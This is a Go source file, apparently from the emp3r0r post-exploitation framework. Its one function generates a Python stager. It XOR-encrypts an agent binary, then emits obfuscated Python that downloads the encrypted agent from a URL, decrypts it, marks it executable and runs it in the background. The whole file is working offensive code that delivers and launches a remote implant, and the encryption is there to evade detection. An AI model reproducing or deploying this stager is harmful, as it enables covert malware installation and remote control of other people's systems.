//go:build linux
// +build linux

package cc


import (
	"fmt"
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func python_http_xor_download_exec(agent_bin_path, url string) (ret []byte) {
	// encrypt payload (agent binary)
	key := tun.GenAESKey(util.RandStr(10))
	fdata, err := os.ReadFile(agent_bin_path)
	if err != nil {
		CliPrintError("python stager failed to read agent binary: %v", err)
		return
	}
	enc_bin := tun.XOREncrypt(key, fdata)
	err = os.WriteFile(fmt.Sprintf("%s.enc", agent_bin_path), enc_bin, 0600)
	if err != nil {
		CliPrintError("Saving XOR encryped agent binary: %v", err)
		return
	}

	// python code
	py_template := fmt.Sprintf(`_A='%s'
import struct,binascii,urllib2,os
def xor_decrypt(key,ciphertext):return ''.join([chr(ord(B)^ord(key[A%%len(key)]))for(A,B)in enumerate(ciphertext)])
def download_file(url):A=urllib2.urlopen(url);B=A.read();return B
open(_A,'wb+').write(xor_decrypt('%s',download_file('%s')))
os.chmod(_A,0o755)
os.system('./%%s&'%%_A)`, util.RandStr(22), key, url)

	return []byte(py_template)
}
